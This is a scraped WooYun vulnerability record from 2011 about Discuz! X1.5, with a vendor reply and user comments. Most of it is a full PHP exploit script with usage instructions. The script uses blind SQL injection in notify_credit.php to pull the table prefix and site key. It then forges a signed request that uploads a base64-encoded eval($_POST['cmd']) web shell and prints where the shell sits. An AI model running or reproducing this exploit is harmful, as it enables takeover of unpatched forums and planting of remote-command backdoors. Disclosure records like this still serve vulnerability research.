{"id": 22613, "wybug_id": "wooyun-2011-02210", "wybug_title": "discuz! X1.5 Get Shell 0day", "wybug_corp": "Discuz!", "wybug_author": "Black.Key", "wybug_date": "2011-06-03 08:34", "wybug_open_date": "2011-07-03 09:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-06-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2011-07-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-08-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-08-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-07-03：\t细节向公众公开  简要描述： 可以自由写入一句话木马 详细说明：  以下为漏洞的EXP\n<?phpprint_r('+---------------------------------------------------------------------------+Discuz! X1-1.5 notify_credit.php Blind SQL injection exploit by toby57    2010.11.05mail: admin at bkey orgteam: http://www.bkey.org说明:alibaba把后续getshell代码添加了下去+---------------------------------------------------------------------------+');if ($argc < 2) {    print_r('+---------------------------------------------------------------------------+Usage: php '.$argv[0].' url [pre]Example:php '.$argv[0].' http://localhost/php '.$argv[0].' http://localhost/ xss_+---------------------------------------------------------------------------+');    exit;}error_reporting(7);ini_set('max_execution_time', 0);$url = $argv[1];$pre = $argv[2]?$argv[2]:'pre_';$target = parse_url($url);extract($target);$path1 = $path . '/api/trade/notify_credit.php';$hash = array();$hash = array_merge($hash, range(48, 57));$hash = array_merge($hash, range(97, 102));$tmp_expstr = \"'\";$res = send();if(strpos($res,'SQL syntax')==false){var_dump($res);die('Oooops.I can NOT hack it.');}preg_match('/FROM\\s([a-zA-Z_]+)forum_order/',$res,$match);if($match[1])$pre = $match[1];$tmp_expstr = \"' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_setting WHERE ''='\";$res = send();if(strpos($res,\"doesn't exist\")!==false){    echo \"Table_pre is WRONG!\\nReady to Crack It.Please Waiting..\\n\";    for($i = 1;$i<20;$i++){    $tmp_expstr = \"' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE '%forum_post_tableid%' AND LENGTH(REPLACE(table_name,'forum_post_tableid',''))=$i AND ''='\";    $res = send();    if(strpos($res,'SQL syntax')!==false){       $pre = '';    $hash2 = array();    $hash2 = array_merge($hash2, range(48, 57));    $hash2 = array_merge($hash2, range(97, 122));    $hash2[] = 95;    for($j = 1;$j <= $i; $j++){    for ($k = 0; $k <= 255; $k++) {    if(in_array($k, $hash2)) {    $char = dechex($k);    $tmp_expstr = \"' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM information_schema.columns WHERE table_schema=database() AND table_name LIKE '%forum_post_tableid%' AND MID(REPLACE(table_name,'forum_post_tableid',''),$j,1)=0x{$char} AND ''='\";    $res = send();    if(strpos($res,'SQL syntax')!==false){        echo chr($k);        $pre .= chr($k);break;    }      }      }         }         if(strlen($pre)){echo \"\\nCracked...Table_Pre:\".$pre.\"\\n\";break;}else{die('GET Table_pre Failed..');};    }    }    };echo \"Please Waiting....\\n\";$sitekey = '';for($i = 1;$i <= 32; $i++){  for ($k = 0; $k <= 255; $k++) {    if(in_array($k, $hash)) {    $char = dechex($k);$tmp_expstr = \"' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_setting WHERE skey=0x6D795F736974656B6579 AND MID(svalue,{$i},1)=0x{$char} AND ''='\";$res = send();if(strpos($res,'SQL syntax')!==false){        echo chr($k);        $sitekey .= chr($k);break;}}}}/*By: alibaba修改与添加了一些代码，如果成功就能得到shell一句话秘密是 : cmd*/if(strlen($sitekey)!=32) {\techo \"\\nmy_sitekey not found. try blank my_sitekey\\n\";}else echo \"\\nmy_sitekey:{$sitekey}\\n\";echo \"\\nUploading Shell...\";$module = 'video';$method = 'authauth';$params = 'a:3:{i:0;i:1;i:1;s:36:\"PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=\";i:2;s:3:\"php\";}';$sign = md5($module . '|' . $method . '|' . $params . '|' . $sitekey);$data = \"module=$module&method=$method&params=$params&sign=$sign\";$path2 = $path . \"/api/manyou/my.php\";POST($host,80,$path2,$data,30);echo \"\\nGetting Shell Location...\\n\";$file = '';for($i = 1;$i <= 32; $i++){\tfor ($k = 0; $k <= 255; $k++) {    \tif(in_array($k, $hash)) {\t\t\t$char = dechex($k);\t\t\t$tmp_expstr = \"' UNION ALL SELECT 0,1,0,0,0,0,0,0,0,0 FROM {$pre}common_member_field_home WHERE uid=1 AND MID(videophoto,{$i},1)=0x{$char} AND ''='\";\t\t\t$res = send();\t\t\tif(strpos($res,'SQL syntax')!==false){\t\t\t\techo chr($k);\t\t\t\t$file .= chr($k);break;\t\t\t}\t\t}\t}}echo \"\\nShell: $host$path/data/avatar/\". substr($file,0,1) . \"/\" . substr($file,1,1) . \"/$file.php\";exit;function sign($exp_str){    return md5(\"attach=tenpay&mch_vno={$exp_str}&retcode=0&key=\");}function send(){    global $host, $path1, $tmp_expstr;         $expdata = \"attach=tenpay&retcode=0&trade_no=%2527&mch_vno=\".urlencode(urlencode($tmp_expstr)).\"&sign=\".sign($tmp_expstr);    return POST($host,80,$path1,$expdata,30);}   function POST($host,$port,$path,$data,$timeout, $cookie='') {\t$buffer='';    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); \telse {        fputs($fp, \"POST $path HTTP/1.0\\r\\n\");        fputs($fp, \"Host: $host\\r\\n\");        fputs($fp, \"Content-type: application/x-www-form-urlencoded\\r\\n\");        fputs($fp, \"Content-length: \".strlen($data).\"\\r\\n\");        fputs($fp, \"Connection: close\\r\\n\\r\\n\");        fputs($fp, $data.\"\\r\\n\\r\\n\");       \t\twhile(!feof($fp)) \t\t{\t\t\t$buffer .= fgets($fp,4096);\t\t}\t\t\t\tfclose($fp);    } \treturn $buffer;} ?>\n   漏洞证明：  \n\n   修复方案：  升级至Discuz! X2   版权声明：转载请注明来源 Black.Key@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2011-06-03 12:28 厂商回复： 该漏洞已于3月22提供补丁修复，但由于部分站长仍未补丁，由于此转载为exp全文，为了不必要的误会以及传播，影响到仍旧未补丁的站长或造成其他用户的误会，对此漏洞1分通过，暂不忽略或公开。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-06-03 18:37 |    \t\t阿神 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 值得。)\t\t \n  貌似利用不到，能爆出一句话地址，但是打不开呢，好像根本就没传上去 似的    \n     2011-06-04 14:28 |    \t\trootsecurity \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:20        | 关注开源，关注网络安全！INSERT INTO `w...)\t\t \n  确实很多站都还没有修补    \n     2011-07-03 11:12 |    \t\t晴天小铸 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:31        | 退出黑客界的纠纷,低调求发展。)\t\t \n  DZ 1.5 getshell原理是什么哪个NB帮我讲解下.    \n     2012-05-29 15:19 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  toby57 这个貌似比较早了吧 t00ls当时放出的？    \n     2012-09-27 17:24 |    \t\tdavie \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:4        | 关注安全)\t\t \n  好久前的吧？我的漏洞就不审核 ，外面复制来的就审核了！哎。》！。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}